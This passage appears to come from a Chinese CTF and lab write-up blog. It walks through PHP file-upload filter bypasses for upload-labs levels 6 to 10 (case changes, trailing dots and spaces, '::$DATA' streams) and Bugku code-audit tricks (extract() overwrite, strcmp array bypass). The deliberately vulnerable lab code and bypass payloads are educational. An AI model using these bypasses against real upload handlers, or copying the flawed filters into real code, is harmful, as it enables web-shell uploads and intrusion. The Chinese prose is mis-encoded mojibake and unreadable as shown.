class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        $file_ext = trim($file_ext); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.date(<span class="hljs-string">"YmdHis"</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = <span class="hljs-keyword">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                $msg = <span class="hljs-string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        $msg = UPLOAD_PATH . <span class="hljs-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;    &#125;&#125;</code></pre></div><p>ä»”ç»†æŸ¥çœ‹æºç ä¼šå‘ç°å°‘äº†ä¸‹é¢çš„è¿™æ®µä»£ç </p><div class="hljs"><pre><code class="hljs php">$file_ext = strtolower($file_ext); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span></code></pre></div><p>è¿™é‡Œå°±å¯ä»¥å¤§å°å†™ç»•è¿‡ã€‚å°†æ–‡ä»¶åç¼€åæ”¹ä¸º<code>.pHp , .PHP</code>ç­‰</p><h2 id="pass7"><a href="#pass7" class="headerlink" title="pass7"></a>pass7</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;$msg = <span class="hljs-keyword">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);        $file_name = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>];        $file_name = deldot($file_name);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);        $file_ext = strtolower($file_ext); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>                <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.date(<span class="hljs-string">"YmdHis"</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;                $is_upload = <span class="hljs-keyword">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                $msg = <span class="hljs-string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ '</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        $msg = UPLOAD_PATH . <span class="hljs-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;    &#125;&#125;</code></pre></div><p>è·Ÿç¬¬å…­å…³å¯¹æ¯”å‘ç°å°‘äº†è¿™å¥è¯</p><div class="hljs"><pre><code>$file_ext = trim($file_ext); //é¦–å°¾å»ç©º</code></pre></div><p> <strong>åˆ©ç”¨Windowsç³»ç»Ÿçš„æ–‡ä»¶åç‰¹æ€§ã€‚æ–‡ä»¶åæœ€åå¢åŠ ç©ºæ ¼å’Œç‚¹ï¼Œå†™æˆ<code>1.php .</code>ï¼Œè¿™ä¸ªéœ€è¦ç”¨burpsuiteæŠ“åŒ…ä¿®æ”¹ï¼Œä¸Šä¼ åä¿å­˜åœ¨Windowsç³»ç»Ÿä¸Šçš„æ–‡ä»¶åæœ€åçš„ä¸€ä¸ª<code>.</code>ä¼šè¢«å»æ‰ï¼Œå®é™…ä¸Šä¿å­˜çš„æ–‡ä»¶åå°±æ˜¯1<code>.php</code></strong> </p><p><img src="https://i.loli.net/2020/11/30/QsiotIUBjlkmYqc.png" srcset="/img/loading.gif" alt></p><h2 id="pass8"><a href="#pass8" class="headerlink" title="pass8"></a>pass8</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;$msg = <span class="hljs-keyword">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);        $file_ext = strtolower($file_ext); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        $file_ext = trim($file_ext); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>                <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.$file_name;            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = <span class="hljs-keyword">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                $msg = <span class="hljs-string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        $msg = UPLOAD_PATH . <span class="hljs-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;    &#125;&#125;</code></pre></div><p>è¿™æ®µä»£ç å°‘äº†è¿™å¥è¯ï¼Œå¯ä»¥ä¸ç¬¬å…­å…³ç›¸åŒçš„åšæ³•</p><p><code>$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</code></p><p><img src="https://i.loli.net/2020/11/30/tyb45fg3MiCU1jG.png" srcset="/img/loading.gif" alt></p><h2 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;$msg = <span class="hljs-keyword">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);        $file_name = deldot($file_name);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);        $file_ext = strtolower($file_ext); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>        $file_ext = trim($file_ext); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>                <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.date(<span class="hljs-string">"YmdHis"</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = <span class="hljs-keyword">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                $msg = <span class="hljs-string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        $msg = UPLOAD_PATH . <span class="hljs-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;    &#125;&#125;</code></pre></div><p>ä»”ç»†è§‚å¯Ÿå‘ç°å°‘äº†è¿™æ®µä»£ç </p><div class="hljs"><pre><code class="hljs php">$file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></code></pre></div><p> é‡‡ç”¨Windowsæ–‡ä»¶æµç‰¹æ€§ç»•è¿‡ </p><p>å°†æ–‡ä»¶åæ”¹ä¸º <code>1.php::$DATA</code>,ä½†æ˜¯å®è´¨ä¸Šä¿å­˜çš„æ–‡ä»¶è¿˜æ˜¯1.php</p><p><img src="https://i.loli.net/2020/11/30/XKUGAeVRzTxNW8Y.png" srcset="/img/loading.gif" alt></p><h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;$msg = <span class="hljs-keyword">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);        $file_name = deldot($file_name);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);        $file_ext = strtolower($file_ext); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        $file_ext = trim($file_ext); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>                <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.$file_name;            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = <span class="hljs-keyword">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                $msg = <span class="hljs-string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        $msg = UPLOAD_PATH . <span class="hljs-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;    &#125;&#125;</code></pre></div><p> è¿™ä¸€å¥ä»£ç æ˜¯ç”¨æ¥æ£€æµ‹æœ«å°¾æ˜¯å¦æ˜¯<code>.</code>ï¼Œå¯ä»¥åŒå†™ç»•è¿‡ã€‚<br>æŠ“åŒ…å°†æ–‡ä»¶åæ”¹ä¸º<code>1.php. .</code> ï¼ˆæ³¨æ„ä¸¤ç‚¹ä¹‹é—´æœ‰ç©ºæ ¼ï¼‰ å‰é¢å»æ‰.ç„¶åæ£€éªŒ.ä¸å­˜åœ¨ï¼Œå†å»ç©ºæ ¼ï¼Œç•™ä¸‹php.ï¼Œç„¶åphp.ä¸å±äº$deny_extæ•°ç»„ä¸­å­˜åœ¨çš„ï¼Œå½“ç„¶å°±ç›´æ¥æäº¤äº†ã€‚å› ä¸ºwindowsè‡ªåŠ¨å»ç‚¹ï¼Œäºæ˜¯phpåç¼€å°±å‡ºæ¥äº† </p><img src="https://i.loli.net/2020/11/30/wldCgUcOSKWPxMu.png" srcset="/img/loading.gif" style="zoom:50%;">]]></content>
    
    
    <categories>
      
      <category>æ–‡ä»¶ä¸Šä¼ </category>
      
      <category>ä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MIME</tag>
      
      <tag>å¤§å°å†™ç»•è¿‡</tag>
      
      <tag>.htaccess</tag>
      
      <tag>windowsæ–‡ä»¶ç‰¹æ€§</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bugkuä»£ç å®¡è®¡</title>
    <link href="/2020/09/14/decode/"/>
    <url>/2020/09/14/decode/</url>
    
    <content type="html"><![CDATA[<h1 id="ç®€å•çš„ä»£ç å®¡è®¡"><a href="#ç®€å•çš„ä»£ç å®¡è®¡" class="headerlink" title="ç®€å•çš„ä»£ç å®¡è®¡"></a>ç®€å•çš„ä»£ç å®¡è®¡</h1><a id="more"></a><h2 id="extractå˜é‡è¦†ç›–"><a href="#extractå˜é‡è¦†ç›–" class="headerlink" title="extractå˜é‡è¦†ç›–"></a>extractå˜é‡è¦†ç›–</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag=<span class="hljs-string">'xxx'</span>;  <span class="hljs-comment">//æ–°å»ºå˜é‡</span>extract($_GET);  <span class="hljs-comment">// å˜é‡è¦†ç›–</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($shiyan))   <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦å­˜åœ¨</span>&#123;$content=trim(file_get_contents($flag));<span class="hljs-comment">//æŠŠæ–‡ä»¶è¯»å…¥å­—ç¬¦ä¸²</span><span class="hljs-keyword">if</span>($shiyan==$content)  <span class="hljs-comment">//åˆ¤æ–­ä¸¤å˜é‡æ˜¯å¦ç›¸ç­‰</span>&#123;<span class="hljs-keyword">echo</span><span class="hljs-string">'flag&#123;xxx&#125;'</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span><span class="hljs-string">'Oh.no'</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>extract()å‡½æ•°</p><p><img src="https://i.loli.net/2020/11/28/z6p1eRwBdhAiJFK.png" srcset="/img/loading.gif" alt="extrct.png"></p><p><strong>isset()å‡½æ•°</strong><br>isset() å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦å·²è®¾ç½®å¹¶ä¸”é NULLã€‚</p><p>å¦‚æœå·²ç»ä½¿ç”¨ unset() é‡Šæ”¾äº†ä¸€ä¸ªå˜é‡ä¹‹åï¼Œå†é€šè¿‡ isset() åˆ¤æ–­å°†è¿”å› FALSEã€‚</p><p>è‹¥ä½¿ç”¨ isset() æµ‹è¯•ä¸€ä¸ªè¢«è®¾ç½®æˆ NULL çš„å˜é‡ï¼Œå°†è¿”å› FALSEã€‚</p><p>åŒæ—¶è¦æ³¨æ„çš„æ˜¯ null å­—ç¬¦ï¼ˆâ€\0â€ï¼‰å¹¶ä¸ç­‰åŒäº PHP çš„ NULL å¸¸é‡ã€‚</p><p>Tips:isset()å‡½æ•°å¦‚æœä¸€æ¬¡ä¼ å…¥å¤šä¸ªå‚æ•°ï¼Œåªæœ‰å‚æ•°å…¨è¢«è®¾ç½®ä¸”éç©ºçš„æƒ…å†µä¸‹æ‰è¿”å›TRUEï¼Œisset()å‡½æ•°å¯¹æ•°ç»„ä¸­çš„å…ƒç´ åŒæ ·é€‚ç”¨ã€‚</p><p>file_get_contents() </p><p><img src="https://i.loli.net/2020/11/28/2TUeHbzKjo3v9WL.png" srcset="/img/loading.gif" alt="file.png"></p><p>å˜é‡è¦†ç›–çš„æ„æ€å°±æ˜¯è®©è‡ªå·±ä¸Šä¼ çš„å˜é‡å€¼è¦†ç›–åŸæœ‰çš„å˜é‡å€¼</p><p>è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯ <code>$shiyan</code>==<code>$content</code>,è€Œcontentçš„å€¼æ¥è‡ªäºå‡½æ•°è‡ªå·±å»ºçš„$flagå˜é‡ï¼Œæ‰€ä»¥è¿™é¢˜ç›®çš„å˜é‡è¦†ç›–å®é™…æ˜¯è¦†ç›–$flagçš„å€¼ï¼Œè®©flagçš„å€¼å’Œshiyançš„å€¼ç›¸åŒ</p><p>å¯ä»¥ç”¨ç©ºå€¼çš„æ–¹æ³•ä½¿äºŒè€…æƒ³ç­‰å³</p><p><code>?shiyan=&amp;flag=</code></p><h2 id="strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"><a href="#strcmpæ¯”è¾ƒå­—ç¬¦ä¸²" class="headerlink" title="strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"></a>strcmpæ¯”è¾ƒå­—ç¬¦ä¸²</h2><p><a href="http://123.206.87.240:9009/6.php" target="_blank" rel="noopener">http://123.206.87.240:9009/6.php</a></p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"flag&#123;xxxxx&#125;"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'a'</span>])) &#123;<span class="hljs-keyword">if</span> (strcmp($_GET[<span class="hljs-string">'a'</span>], $flag) == <span class="hljs-number">0</span>) <span class="hljs-comment">//å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1å¤§äº str2è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚</span><span class="hljs-comment">//æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span><span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">print</span> <span class="hljs-string">'No'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>é¢˜ç›®ç»™çš„æ³¨é‡Šå¾ˆæ¸…æ¥šçš„ç»™å‡ºäº†è·å¾—flagçš„æ¡ä»¶ã€‚ã€‚ã€‚</p><p>å…ˆäº†è§£ä¸€ä¸‹</p><p><img src="https://i.loli.net/2020/11/28/HzFDTPCwtU1rkf2.png" srcset="/img/loading.gif" alt="strcmp.png"></p><p>strcmp()çš„ä¸¤ä¸ªå‚æ•°éƒ½å¿…é¡»æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„ï¼Œä½†æ˜¯å¦‚æœä¼ é€’ä¸€ä¸ªéå­—ç¬¦ç©¿ç±»å‹çš„å‚æ•°è¿›å»ï¼Œä¾‹å¦‚æ•°ç»„ï¼Œåˆ™å‡½æ•°å°±ä¼šæŠ¥é”™ï¼Œå…¶è¿”å›å€¼å°±ä¸º0ã€‚æ»¡è¶³ <code>if (strcmp($_GET[&#39;a&#39;], $flag) == 0)</code>  å³å¯è·å¾—flag</p><p><strong>url:<code>http://123.206.87.240:9009/6.php?a[]=</code></strong></p><h2 id="urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"><a href="#urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡" class="headerlink" title="urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"></a>urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡</h2><p>é¢˜ç›®è¯´çš„å¾ˆæ¸…æ¥šäº†ï¼ŒäºŒæ¬¡ç¼–ç ç»•è¿‡</p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-keyword">if</span>(eregi(<span class="hljs-string">"hackerDJ"</span>,<span class="hljs-variable">$_GET</span>[id])) &#123;<span class="hljs-built_in">echo</span>(<span class="hljs-string">"</span><span class="hljs-string"></span><span class="hljs-string">not allowed!</span><span class="hljs-string"></span><span class="hljs-string">"</span>);</code></pre></div><blockquote><p>PHP å‡½æ•° eregi()</p><p>è¯­æ³•<br> int eregi(string pattern, string string, [array regs]);<br> å®šä¹‰å’Œç”¨æ³•<br> eregi()å‡½æ•°åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²æœç´¢æŒ‡å®šçš„æ¨¡å¼çš„å­—ç¬¦ä¸²ã€‚æœç´¢ä¸åŒºåˆ†å¤§å°å†™ã€‚Eregi()å¯ä»¥ç‰¹åˆ«æœ‰ç”¨çš„æ£€æŸ¥æœ‰æ•ˆæ€§å­—ç¬¦ä¸²,å¦‚å¯†ç ã€‚</p><p>å¯é€‰çš„è¾“å…¥å‚æ•°è§„åˆ™åŒ…å«ä¸€ä¸ªæ•°ç»„çš„æ‰€æœ‰åŒ¹é…è¡¨è¾¾å¼,ä»–ä»¬è¢«æ­£åˆ™è¡¨è¾¾å¼çš„æ‹¬å·åˆ†ç»„ã€‚</p><p>è¿”å›å€¼<br> å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›false</p></blockquote><p>è¿™é‡Œè¿›è¡Œäº†è¿‡æ»¤ï¼Œä¼ 